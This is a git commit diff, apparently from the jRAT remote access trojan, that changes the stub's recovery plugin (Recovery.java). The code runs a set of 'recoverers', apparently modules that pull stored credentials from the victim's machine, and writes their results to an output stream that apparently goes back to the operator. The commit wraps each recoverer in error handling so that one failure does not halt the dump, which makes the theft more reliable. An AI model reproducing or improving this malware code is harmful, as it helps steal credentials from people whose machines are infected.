4d87a11edd3c0aa1f37b4112267dd3a4b9b87481
redpois0n <red@cmail.nu>
2016-01-08 10:16:00 +0100

    Allow one recoverer to fail

--- stub/src/jrat/plugin/recovery/stub/Recovery.java
+++ stub/src/jrat/plugin/recovery/stub/Recovery.java
@@ -16,20 +16,24 @@ public class Recovery {
 	
 	public static void dump(DataOutputStream dos) throws Exception {
 		for (AbstractRecoverer r : RECOVERERS) {
-			List<String[]> list = r.recover();
-			
-			if (list != null) {
-				for (String[] a : list) {
-					dos.writeShort(RecoveryPlugin.HEADER);
-					dos.writeShort(r.getName().length());
-					dos.writeChars(r.getName());
-					dos.writeShort(a.length);
-					
-					for (String s : a) {
-						dos.writeShort(s.length());
-						dos.writeChars(s);
+			try {
+				List<String[]> list = r.recover();
+				
+				if (list != null) {
+					for (String[] a : list) {
+						dos.writeShort(RecoveryPlugin.HEADER);
+						dos.writeShort(r.getName().length());
+						dos.writeChars(r.getName());
+						dos.writeShort(a.length);
+						
+						for (String s : a) {
+							dos.writeShort(s.length());
+							dos.writeChars(s);
+						}
 					}
 				}
+			} catch (Exception e) {
+				e.printStackTrace();
 			}
 		}
 	}
